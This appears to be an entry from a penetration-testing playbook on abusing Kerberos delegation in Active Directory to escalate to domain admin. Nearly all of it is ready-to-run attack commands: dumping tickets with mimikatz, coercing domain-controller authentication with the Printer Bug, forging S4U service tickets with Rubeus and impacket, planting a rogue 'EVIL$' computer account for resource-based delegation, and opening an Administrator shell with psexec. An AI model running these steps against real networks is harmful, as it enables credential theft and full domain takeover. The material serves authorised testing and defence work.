---
id: kerberos-delegation
title: Kerberos Delegation Abuse
stage: privesc
tags: [windows, ad, kerberos]
tools:
  - impacket-findDelegation domain.local/user:pass -dc-ip $DC
  - Get-ADComputer -Filter {TrustedForDelegation -eq $true}
  - Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/$TARGET
leads_to: [domain-admin, system-shell]
summary: Abuse Unconstrained, Constrained, or Resource-Based Constrained Delegation to impersonate privileged users and access services.
---

## Find Delegation Configurations

```bash
# From Linux
impacket-findDelegation domain.local/user:password -dc-ip $DC

# From Windows / PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Unconstrained Delegation

Any computer/account with `TrustedForDelegation = True` stores TGTs of authenticating users in memory:

```powershell
# On the unconstrained delegation machine (as admin):
# Wait for a DA to authenticate (or coerce with Printer Bug / PetitPotam)

# Extract TGTs from memory
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Or with Rubeus — monitor for incoming tickets
Rubeus.exe monitor /interval:5 /nowrap
# After a DA TGT arrives:
Rubeus.exe ptt /ticket:BASE64_TICKET
```

**Coerce DC authentication (Printer Bug):**
```bash
python3 printerbug.py domain.local/user:password@$DC $UNCONSTRAINED_MACHINE
```

## Constrained Delegation (S4U2Self + S4U2Proxy)

Account has `TrustedToAuthForDelegation` set or has `msDS-AllowedToDelegateTo` populated:

```bash
# Get NTLM hash of the service account first
# Then use S4U to get a service ticket impersonating Administrator

# With Impacket
impacket-getST -spn cifs/$TARGET.domain.local \
  -impersonate Administrator \
  domain.local/svc_account:password -dc-ip $DC

KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass domain.local/Administrator@$TARGET

# With Rubeus (from Windows)
Rubeus.exe s4u \
  /user:svc_account \
  /rc4:NTLM_HASH \
  /impersonateuser:Administrator \
  /msdsspn:"cifs/$TARGET" \
  /ptt
```

## Resource-Based Constrained Delegation (RBCD)

If you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object:

```powershell
# Step 1: Create a fake computer account (or use one you control)
impacket-addcomputer domain.local/user:password -computer-name EVIL$ -computer-pass EvilPass123! -dc-ip $DC

# Step 2: Set RBCD — allow EVIL$ to delegate to the target
$SID = (Get-ADComputer EVIL).SID
Set-ADComputer $TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount (Get-ADComputer EVIL)

# From Linux with impacket
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to '$TARGET_COMPUTER$' \
  domain.local/user:password -dc-ip $DC

# Step 3: S4U2Self + S4U2Proxy
impacket-getST -spn cifs/$TARGET.domain.local \
  -impersonate Administrator \
  domain.local/'EVIL$':EvilPass123! -dc-ip $DC

KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

## Notes

- Unconstrained delegation is legacy and dangerous — common on older DCs and print servers
- Constrained delegation is safer but still abusable when you have the service account's hash
- RBCD requires WriteProperty rights on the target computer object — check with BloodHound
- Coercion attacks (Printerbug, PetitPotam, Coerce) are the usual way to make a DC send its TGT to an unconstrained delegation host

